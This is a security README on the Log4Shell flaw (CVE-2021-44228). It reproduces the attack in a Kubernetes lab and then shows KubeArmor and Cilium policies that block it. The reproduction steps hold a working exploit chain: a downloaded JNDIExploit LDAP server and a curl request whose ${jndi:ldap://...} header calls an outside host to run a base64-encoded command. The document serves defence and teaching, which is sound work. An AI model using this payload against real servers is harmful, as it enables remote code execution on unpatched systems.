# Apache Log4j Zero Day aka Log4Shell aka CVE-2021-44228

<!-- vim-markdown-toc GFM -->

* [Introduction](#introduction)
* [Reproducing the problem in k8s env](#reproducing-the-problem-in-k8s-env)
	* [Setting up k8s env with the vulnerability](#setting-up-k8s-env-with-the-vulnerability)
* [Possible Solutions](#possible-solutions)
	* [KubeArmor Security Policy](#kubearmor-security-policy)
		* [Not allowing any execs from the JVM/Java](#not-allowing-any-execs-from-the-jvmjava)
		* [Default Deny based rules](#default-deny-based-rules)
		* [KubeArmor Visibility/Observability into the pods](#kubearmor-visibilityobservability-into-the-pods)
	* [Cilium Network Policy](#cilium-network-policy)
		* [Restricting access to RMI ports](#restricting-access-to-rmi-ports)
* [Preventing future Zero-Days](#preventing-future-zero-days)
	* [How could a Zero Trust posture prevent misuse of log4j vulnerability?](#how-could-a-zero-trust-posture-prevent-misuse-of-log4j-vulnerability)
	* [KubeArmor and Zero Trust](#kubearmor-and-zero-trust)
* [Credits](#credits)

<!-- vim-markdown-toc -->

## Introduction

On December 9th, 2021, the world was made aware of a new vulnerability
identified as
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), affecting
the Apache Java logging package log4j. This vulnerability earned a severity
[score of
10.0](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44228&vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1&source=NIST)
(the most critical designation) and offers trivial remote code execution on
hosts engaging with software that utilizes this log4j version.  “Log4Shell" is
the name given to this assault.

Today, log4j version 2.15.0rc2 is available and patches this vulnerability.
However, the sheer danger of this vulnerability is due to how ubiquitous the
logging package is. Millions of applications as well as software providers use
this package as a dependency in their own code.

[Earliest detection known](https://twitter.com/eastdakota/status/1469800951351427073): 2021-12-01 04:36:50 UTC
![alt txt](res/tweet.png)

**Affected Versions:**
* Log4j <= 2.14.1
* Apache: 2.0 <= Apache log4j <= 2.14.1

Who is affected?
* **Impact**: Arbitrary code execution as the user the parent process is running as (code fetched from the public Internet, or lolbins already present on system, or just fetching shared secrets or environment variables and returning them to the attacker).

* **Targets**: Servers and clients that run Java and also log anything using the log4j framework - primarily a server-side concern, but any vulnerable endpoint could be a target or a pivot point.

* **Downstream projects**: Until proven otherwise, assume anything that includes log4j - including Elasticsearch, Apache Struts / Solr / Druid / Flink, etc. - is affected in a way that requires mitigation.

* **Affected versions**: log4j 2.x confirmed - log4j 1.x only indirectly (previous information disclosure vulns) (in some [configurations](https://twitter.com/nluedtke1/status/1469435658389561345))

* **Appliances**: Don't forget appliances that may be using Java server components, but won't be detected by unauthenticated vulnerability scanning

* **Log forwarding**: Logging infrastructure often has many "northbound" (send my logs to someone) and "southbound" (receiving logs from someone) forwarding/relaying topologies. Chaining them together for exploitation must also be considered.

* **Cloud**: Multiple large providers also affected (A community-curated list of software and services vulnerable to CVE-2021-44228 can be found in [this GitHub repo](https://github.com/YfryTchsGD/Log4jAttackSurface).

## Reproducing the problem in k8s env

![log4j attack tree](res/log4j_attack_tree.png)

### Setting up k8s env with the vulnerability
**Step #1:** Deploying pod with associated services vulnerable to Log4j in Kubernetes
```sh
git clone https://github.com/kubearmor/log4j-cve && cd log4j-cve
kubectl apply -f deploy-log4j-k8s.yaml
```

 - To check the deployment is running and to get external IP type the following command:
```sh
kubectl get po,svc
```
 - You should be able to see the output like this
```sh
NAME                              READY   STATUS    RESTARTS   AGE
pod/log4j-demo-5d7c84d8b9-vs8ck   1/1     Running   0          1h30m

NAME                 TYPE           CLUSTER-IP     EXTERNAL-IP     PORT(S)        AGE
service/kubernetes   ClusterIP      10.112.0.1     <none>          443/TCP        4h44m
service/log4j-svc    LoadBalancer   10.112.8.158   35.241.165.36   80:30202/TCP   1h30m
```
> Kindly note we've deployed vulnerable Log4Shell sample application in `default` namespace

**Step #2:** Downloading malicious LDAP server
```sh
wget https://log4j-knox.s3.amazonaws.com/JNDIExploit-1.2-SNAPSHOT.jar
```

**Step #3:** Starting LDAP Server for incoming traffic on your PC or Cloud VM
```sh
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i [<your-private-ip>] -p 8888
```
> Private IP can be queried using `hostname -I`.<br> Make sure your firewall allows traffic for ports `1389` and `8888`

**Step #4:** Exploiting using `cURL` command
```sh
# curl <protocol://victim-ip:port> -H 'X-Api-Version: ${jndi:ldap://<malicious-server-ip>:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
curl http://35.241.165.36 -H 'X-Api-Version: ${jndi:ldap://34.135.86.213:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
> Here, 1st IP used is our k8s external IP (Step #1) where the vulnerable sample app is running.<br> 2nd IP used is the external IP of the malicious LDAP server (Step #2)

**Step #5:** Confirmation via checking creation of file `/tmp/pwned`
```
kubectl exec -it --namespace default log4j-demo-5d7c84d8b9-vs8ck -- watch -n 2 ls /tmp
```
> Replace `log4j-demo-5d7c84d8b9-vs8ck` with your pod from output of Step #1.<br> You should be able to see a file created as `pwned` inside `/tmp` directory.

## Possible Solutions

### KubeArmor Security Policy

[KubeArmor](https://github.com/kubearmor/kubearmor) is a Runtime Security
Platform that can help Security/DevSecOps teams to protect their workloads
using application/systems based controls (such as limiting Process Spawning,
limiting File System access, limiting pods capabilities etc). KubeArmor has a
visibility mode using which the application/security team can enable visibility
thereby figuring out what is happening inside the pods i.e., what processes are
spawned, what file acesses are attempted etc. The biggest advantage about
KubeArmor is that as a user you can also submit policies that can
prevent/block/deny such systems operations.

Typically an attacker infiltrates with the intent to either exfiltrate the
internal data or for cryptomining or to simply wreck havoc in the internal apps
with the intent to make it unavailable. In all these cases, the attacker needs
to execute an arbitrary program that can fulfill its malicious intent. Log4j
vulnerability allows the attacker to place a binary within the internal
network. However, guardrails can be placed so as not to allow the JVM to spawn
processes.

#### Not allowing any execs from the JVM/Java
Following is a KubeArmor that can deny/prevent any processes from been forked
in the pod as a child process of Java application.

```yaml=
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: do-not-allow-exec-from-java
spec:
  severity: high
  message: "disallow execing from java process"
  selector:
    matchLabels:
      app: log4j2
  process:
    matchPaths:
    - path: * #disaallow all paths from the java process
      fromSource:
      - path: /opt/openjdk-16/bin/java
  action:
    Block
```
Note that the action is `Block` here. Also note the `fromSource` condition that
says that only the execs from the given process should be disallowed.
Essentially, only the child processes of Java/JVM be denied an exec. Unlike
other tooling, KubeArmor has the ability to `Block` the system's operation at
runtime.

#### Default Deny based rules
In lot of cases, there could be certain existing processes that still needs to
be spawned by the Java/JVM. In such cases, it is best to `Allow` such
processes. By allowing these processes, KubeArmor by default denies execing of
all other processes as part of that parent process:

```yaml=
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: do-not-allow-exec-from-java
spec:
  severity: high
  message: "disallow execing from java process"
  selector:
    matchLabels:
      app: log4j2
  process:
    matchPaths:
    - path: /usr/local/bin/myapp
      fromSource:
      - path: /opt/openjdk-16/bin/java
    - path: /usr/local/bin/log4j
      fromSource:
      - path: /opt/openjdk-16/bin/java
  action:
    Allow
```
In this example, the `myapp` and `log4j` processes are still allowed to be
spawned by the Java process but the rest all processes are denied.

#### KubeArmor Visibility/Observability into the pods
Looking at the above policies, one naturally will think, how am I going to get
the process spec to allow/deny. This is where KubeArmor's visibility mode comes into play:

```
== Log / 2021-12-12 19:48:37.737160 ==
Cluster Name: Default
Host Name: pandora
Namespace Name: default
Pod Name: log4j-kubearmor
Container ID: 7ccca0b0a09ba86c96d581f695a534d0ec1d7a844f30efc16e0e72568a84cc39
Container Name: log4j-kubearmor
Type: ContainerLog
Source: jspawnhelper
Operation: Process
Resource: /bin/touch /tmp/log4jServerp0wn3d
Data: syscall=SYS_EXECVE
Result: Passed
```

Blocking any processes spawned from JVM/Java process results in following alert
while the execve is denied (Note that KubeArmor is an enforcement engine):

```
== Alert / 2021-12-12 19:57:07.871126 ==
Cluster Name: Default
Host Name: pandora
Namespace Name: default
Pod Name: log4j-kubearmor
Container ID: 7ccca0b0a09ba86c96d581f695a534d0ec1d7a844f30efc16e0e72568a84cc39
Container Name: log4j-kubearmor
Policy Name: do-not-allow-exec-from-java
Severity: 5
Message: disallowed execing from java process
Type: MatchedPolicy
Source: jspawnhelper
Operation: Process
Resource: /bin/touch /tmp/log4jServerp0wn3d
Data: syscall=SYS_EXECVE
Action: Block
Result: Passed
```

### Cilium Network Policy

Cilium team has already come up with their
[analysis](https://isovalent.com/blog/post/2021-12-log4shell) for preventing
exploits for log4j in k8s env using network policies. Essentially, the
prevention policies aims at ensuring that the least permissive policies for DNS
are applied such that anything outside of that realm is forbidden.

One challenge for a security team in this context could be to figure out all
the possible FQDNs connected to by the pods. Cilium provides rich network
visibility using which one can possibly come up with the exhaustive set of
FQDNs accessed by the pods.

In addition to those policies there are few other preventive policies that
could be undertaken.

#### Restricting access to RMI ports

RMI is functionality least utilized by most of the organizations. In case of
log4j, the RMI is enabled by default and most organization might not care if it
is disabled altogether. So if your organization is not actively using that
feature, the best is to disable it altogether. Following Cilium policy could be put to use:

```yaml=
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "L4_rule_to_block_RMI_access"
spec:
  endpointSelector:
    matchLabels:
      app: log4j2
  ingress:
  - fromEndpoints:
    toPorts:
    - ports:
      - port: "1099"
        protocol: TCP
```
... where 1099 is the default RMI port.

## Preventing future Zero-Days

> The kind of rules depicted above are easy to be envisaged in hindsight. 

The obvious next question is how to prevent possibility of misuse of such
vulnerabilities in the future.

Arbitrary Code Execution is a major attack mode and one has to focus on
defining what makes the code “arbitrary”. Arbitrary in the context could be
defined as anything that is not in the usual execution context.

Using Zero-trust (ZTNA) architecture requires one to specify a least-permissive
policy set that only allows whitelisted actions and deny everything else. Thus,
having a Zero-Trust posture could effectively guard an organization from the
possibilities of such attacks.

However, achieving Zero-Trust in practice is much more challenging. Zero-trust
requires that an organization have appropriate automation, software deployment
processes coupled with the right tools. Few points to ponder over could be:

* Having flexible policy enforcement engines is not good enough. How to achieve
  a least permissive policy set that goes with those policy engines?
* If a developer makes changes to the app, do you have an automated process to
  inculcate new rules that might have changed due to app changes?
* Does the org have a flexible EDR/XDR that allows the DevSecOps and Security
  teams to focus on right events?

### How could a Zero Trust posture prevent misuse of log4j vulnerability?
A Zero-Trust posture across network and applications/systems could be defined as follows:

1. Only allow ingress/egress connections the application is supposed to make/handle.
2. Only allow the process execs that are in the allowed list.
3. Only allow file-system path accesses that the application needs.
4. Only allow the system capabilities that are required for application’s normal needs.
5. Achieving this posture is easier said than done.

### KubeArmor and Zero Trust
KubeArmor provides a flexible policy enforcement engines coupled with the right
policy discovery/recommendations tools that precisely help an organization
answer the above questions. Accuknox has built the policy engines with basic
design tenets in mind i.e., every policy engine must support observability,
auditing (dry-run), and enforcement options.

> Observability coupled with policy discovery engine can provide an
> organization with the least-permissive policy settings required.

![policy discovery](res/policy-discovery.png)

If you want to try the policy-discovery engine on your k8s cluster with your
workloads, please follow the
[playbook](https://help.accuknox.com/open-source/quick_start_guide/) here.

<!--
## Credits
* Author: Rahul Jadhav (@nyrahul) for providing remediation steps using Cilium and Kubearmor policy engines
* Author: Ravi Kishor (@raviknox) for providing his analysis on the log4j problem and reproducing the problem in k8s cluster.
-->
